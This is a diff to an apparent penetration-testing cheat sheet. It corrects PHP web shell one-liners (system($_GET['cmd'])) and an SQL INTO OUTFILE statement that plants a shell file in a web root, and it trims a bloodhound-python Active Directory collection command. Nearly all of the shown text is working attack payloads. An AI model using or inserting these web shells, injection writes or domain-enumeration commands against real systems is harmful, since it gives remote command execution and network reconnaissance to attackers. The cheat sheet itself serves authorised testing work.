@@ -376,7 +376,7 @@ IF EXISTS (SELECT 1 FROM dbo.users WITH(NOLOCK) WHERE username like 'a%') WAITFO
 
 ### PHP Web Shell
 ```
-select "<?php system($_GET[cmd]);?>" into outfile '/var/www/html/cronoshell.php'
+select "<?php system($_GET['cmd']);?>" into outfile '/var/www/html/cronoshell.php'
 ```
 
 # Passwords attack
@@ -477,7 +477,7 @@ export SHELL=bash
 
 RCE PHP
 ```
-<?php system($_GET[cmd]);?>
+<?php system($_GET['cmd']);?>
 ```
 
 RCE .aspx
@@ -945,7 +945,7 @@ disown
 
 Remote collection (--dns-tcp with proxychains)
 ```
-bloodhound-python -u USER -p PASSWORD -ns IP -d domain.local -c All --zip BloodHound.zip
+bloodhound-python -u USER -p PASSWORD -ns IP -d domain.local -c All
 ```
 Local Collection [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
 ```
